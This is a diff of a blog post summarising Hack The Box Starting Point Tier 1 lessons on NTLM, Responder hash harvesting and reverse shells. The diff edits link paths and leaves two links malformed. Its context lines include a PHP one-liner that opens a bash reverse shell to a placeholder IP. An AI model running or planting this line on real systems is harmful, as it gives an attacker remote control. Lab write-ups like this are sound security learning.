@@ -2,7 +2,7 @@
 title: 'HTB Starting Point - Tier 1'
 description: 'Hack the Box Starting Point'
 pubDate: 'Dec 5 2024'
-heroImage: '/blog-placeholder-2.jpg'
+heroImage: 'blog-placeholder-2.jpg'
 ---
 
 Topics covered:  
@@ -33,7 +33,7 @@ In Tier 1, we covered even more topics. The following summary captures a bunch o
 
 #### NTLM
 
-This is described in more detail on the post: "[Harvesting NTLM Credentials](/blog/htb-starting-point/harvesting-ntlm-creds)"
+This is described in more detail on the post: "[Harvesting NTLM Credentials]blog/htb-starting-point/harvesting-ntlm-creds)"
 * A set of challenge-response protocols used in Microsoft systems. 
 * An NTHash is the output of the NTLM protocol's hash algorithm. This NTHash is stored on the SAM DB on a local machine, or on a domain controller.
 * NetNTLMv2 is a specific string format to represent a challenge and its response. Colloquially known as a hash even though it's not
@@ -72,7 +72,7 @@ When approaching a box:
 
 A useful tool to harvest NTLM hashes. It can poison resolution protocols to trick computers into thinking the attacker's machine is the correct server. In the responder challenge, we obtained the NTLM hash by exploiting the web server's trust in our authority as an SMB server. It willingly handed over the hash!
 
-This is described in more detail on the post: "[Harvesting NTLM Credentials](/blog/htb-starting-point/harvesting-ntlm-creds)"
+This is described in more detail on the post: "[Harvesting NTLM Credentials]blog/htb-starting-point/harvesting-ntlm-creds)"
 
 #### Simple reverse shell
 
@@ -82,4 +82,4 @@ A simple reverse shell command in PHP
 <?php system("bash -i >& /dev/tcp/<IP>/1337 0>&1")?>
 ```
 
-You can read more details in this blog post: "[Obtain a Reverse Shell With PHP and Bash](/blog/htb-starting-point/reverse-shell-php-and-bash/)"
+You can read more details in this blog post: "[Obtain a Reverse Shell With PHP and Bash](blog/htb-starting-point/reverse-shell-php-and-bash/)"
